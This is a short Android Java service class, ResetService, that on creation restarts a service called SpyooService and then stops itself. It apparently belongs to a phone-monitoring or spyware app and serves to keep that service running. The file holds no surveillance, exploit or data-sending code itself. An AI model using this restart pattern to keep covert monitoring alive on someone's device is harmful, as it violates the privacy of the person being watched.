package iits.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import iits.mamager.FileManager;

public class ResetService extends Service {
    private static final String TAG = "ResetService";

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        try {
            startService(new Intent(this, SpyooService.class));
            stopSelf();
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onCreate function: " + e.toString());
        }
    }

    public void onDestroy() {
        super.onDestroy();
    }
}
